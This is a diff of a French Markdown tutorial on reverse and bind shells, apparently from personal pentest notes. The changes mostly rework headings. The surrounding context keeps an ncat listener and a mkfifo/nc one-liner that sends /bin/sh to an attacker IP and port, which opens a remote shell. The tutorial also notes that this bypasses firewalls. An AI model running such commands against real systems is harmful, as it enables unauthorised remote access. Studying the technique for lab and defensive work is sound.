@@ -36,13 +36,16 @@ On peut **[créer des reverses shell pour des langages de programation en partic
 
 Un **reverse shell** est ce qui se produit quand une cible **éxécute un code qui connecte un shell à notre machine** (`/bin/bash` sur linux et `cmd.exe` sur windows). L'avantage d'un reverse shell est qu'on **contourne les règles des firewalls**, cependant le problème est qu'on est obligé de notre coté de **configurer notre réseau pour accepter ce shell**.
 
+#### 1- Mise en place du listener
+
 Notre machine
 
 ```shell
 user@ip:~$ sudo ncat -lvnp 443
 Listening on 0.0.0.0 443
 ```
-**Mise en place du listener**.
+
+####2Execution du script
 
 Machine cible
 
@@ -53,9 +56,9 @@ ou
 ```shell
 user@raspberrypi: ~$ mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
 ```
-si ncat ne prends pas en paramètre -e
+si ncat ne prends pas `-e`
 
-**Execution du script**.
+**Execution de commande sur la machine cible**.
 
 Notre machine
 
@@ -76,7 +79,6 @@ script.py.save
 Templates
 Videos
 ```
-**Execution de commande sur la machine cible**.
 
 ### Bind shell
 
@@ -207,3 +209,4 @@ root@raspberrypi:/home/user# stty rows 30
 root@raspberrypi:/home/user# stty columns 120
 root@raspberrypi:/home/user# jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
 ```
+
